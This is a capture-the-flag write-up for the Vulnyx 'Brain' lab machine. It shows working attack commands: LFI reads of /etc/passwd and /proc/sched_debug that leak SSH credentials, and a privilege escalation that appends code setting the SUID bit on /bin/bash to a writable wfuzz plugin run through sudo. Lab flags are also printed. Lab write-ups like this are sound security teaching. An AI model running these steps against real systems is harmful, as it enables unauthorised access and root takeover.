# Vulnyx: Brain

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `ffuf` · `curl` · `hydra` · `wfuzz` |
| **Tags** | `#LFI` `#ProcFS` `#CredentialLeak` `#SudoAbuse` `#SUID` `#PrivEsc` |
| **URL** | https://vulnyx.com/machines/ |

The main page hints at a Local File Inclusion vulnerability by rendering content that looks like the kernel's task scheduler output. The `include` parameter is confirmed and used to read `/etc/passwd`, enumerating valid users, before being pointed at that same scheduling data directly — leaking a set of SSH credentials for `ben`, hidden inside a process name. Once logged in, `sudo` access to `wfuzz` — combined with a writable plugin file under its Python package — is enough to run arbitrary code as root and set the SUID bit on `/bin/bash`.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn brain.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:43:C4:B4 (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV brain.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da (RSA)
|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 (ECDSA)
|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:43:C4:B4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache 2.4.38 on Debian, and an outdated OpenSSH (7.9p1) — nothing exploitable at the version level, so the web app itself becomes the focus.

### Web Enumeration

The main page:

```
http://brain.nyx
```

The content rendered on the front page looks suspiciously like the output of `/proc/sched_debug` — the kernel's task scheduler dump. That's an odd thing to display on a landing page, and it's the first hint that the app is including a local file into the page rather than serving static content:

<img src="../Images/brain/Pasted image 20260517181111.png" alt="brain.nyx main page, showing content resembling /proc/sched_debug output"/>

A directory scan looks for pages not linked from the front page:

```bash
$ gobuster dir -u 'http://brain.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 361]
server-status         (Status: 403) [Size: 277]
Progress: 882232 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

### Local File Inclusion

`index.php` looks like it's pulling in content dynamically, which raises the question of whether one of its parameters can be pointed at an arbitrary file. `ffuf` fuzzes for a parameter name that changes the response when set to a known file path:

```bash
$ ffuf -u 'http://brain.nyx/index.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 361

include               [Status: 200, Size: 1750, Words: 125, Lines: 34, Duration: 18ms]
:: Progress: [4614/4614] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

The `-fs 361` flag filters out the baseline response size, so only parameter names that actually change the page's output survive in the results — a match here means that parameter name is being used somewhere to include a file. A quick check confirms the finding:

```
view-source:http://brain.nyx/?include=/etc/passwd
```

<img src="../Images/brain/Pasted image 20260517181210.png" alt="/etc/passwd contents rendered through the vulnerable include parameter"/>

The response includes the contents of `/etc/passwd`, confirming arbitrary local file read and enumerating valid shell users on the box:

```bash
$ curl -sX GET "http://brain.nyx/index.php?include=/etc/passwd" | grep "sh$"

root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:ben,,,:/home/ben:/bin/bash
```

Two users with a real shell turn up: `root` and `ben`. Following up on the earlier hint from the front page — whose content already resembled a `sched_debug` dump — the `include` parameter is pointed at `/proc/sched_debug` directly, and the output is filtered for the username just enumerated, `ben`:

```bash
$ curl -sX GET "http://brain.nyx/index.php?include=/proc/sched_debug" | grep ben
S   ben:B3nP4zz    375   1257.728035    25   120         0.000000        0.989759      0.000000 0 0
```

The field that leaks here isn't a command line — `/proc/sched_debug` doesn't expose those. What it does expose is `comm`, the short process name associated with each task, which any process can set arbitrarily for itself (via `argv[0]` or `prctl(PR_SET_NAME)`). Here, a running process was deliberately named `ben:B3nP4zz`, so its literal name — not an argument or a command — ends up embedded straight in the scheduling table dump.

> **Credentials found:** `ben:B3nP4zz`

## Initial Access

### Shell as ben

`hydra` validates the credentials against SSH:

```bash
$ hydra -l 'ben' -p 'B3nP4zz' ssh://brain.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://brain.nyx:22
[22][ssh] host: brain.nyx   login: ben   password: B3nP4zz
1 of 1 test successfully completed, 1 valid password found
```

They check out, and a connection follows:

```bash
$ ssh ben@brain.nyx
ben@brain.nyx's password:
ben@brain:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
ben@brain:~$ ls -l /home/ben
total 4
-r-------- 1 ben ben 33 Apr 19  2023 user.txt
ben@brain:~$ cat /home/ben/user.txt
4be68799a5cef6a6e2b36379e8ae2759
```

> **User flag:** `4be68799a5cef6a6e2b36379e8ae2759`

## Privilege Escalation

### Sudo `wfuzz` + a Writable Plugin

```bash
ben@brain:~$ sudo -l
Matching Defaults entries for ben on Brain:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ben may run the following commands on Brain:
    (root) NOPASSWD: /usr/bin/wfuzz
ben@brain:~$ find / -writable 2>/dev/null | grep -vE "proc/sys/tmp/run/dev/home/var"
/usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
ben@brain:~$ ls -l /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
-rwxrwxrwx 1 root root 1519 Apr 19  2023 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
```

`ben` can run `wfuzz` as root via `sudo`, and one of `wfuzz`'s own Python payload plugins, `range.py`, turns out to be writable. Since `wfuzz` imports and executes that plugin's code as part of generating its fuzz payloads, anything appended to the file runs in whatever context `wfuzz` itself is running under — root, in this case, once invoked through `sudo`.

Appending malicious Python to the plugin sets the SUID bit on `/bin/bash`:

```bash
ben@brain:~$ echo -e 'import os\nos.system("chmod 4755 /bin/bash")' >> /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
```

Running `wfuzz` as root with that same payload type loads and executes the modified plugin:

```bash
ben@brain:~$ sudo -u root /usr/bin/wfuzz -c -z range,1-65535 -u http://127.0.0.1/FUZZ
```

Once it runs, the SUID bit is in place:

```bash
ben@brain:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root ... /bin/bash
```

A SUID `bash` retains the privileges of its owner (root) when invoked with `-p`, which skips bash's usual privilege-dropping behavior for SUID binaries:

```bash
ben@brain:~$ /bin/bash -p
bash-5.0# id
uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben)
bash-5.0# ls -l /root
total 4
-r-------- 1 root root 33 Apr 19  2023 root.txt
bash-5.0# cat /root/root.txt
08c391c2d775390f54ee859d7395ac68
```

> **Root flag:** `08c391c2d775390f54ee859d7395ac68`

## Takeaways

- A parameter that includes local files is a Local File Inclusion vulnerability regardless of how it's used elsewhere in the app — fuzzing for unlisted parameter names is often the only way to find it when there's no obvious `?page=` or `?file=` hint.
- Files under `/proc` can leak more than most people expect; scheduling and process info meant for debugging can end up exposing details never intended to be public, especially when combined with an LFI.
- `sudo` rules that allow running a tool as root only restrict the *binary path*, not what that binary loads at runtime — a writable plugin, config file, or library used by an allowed command is just as dangerous as the sudo rule being unrestricted.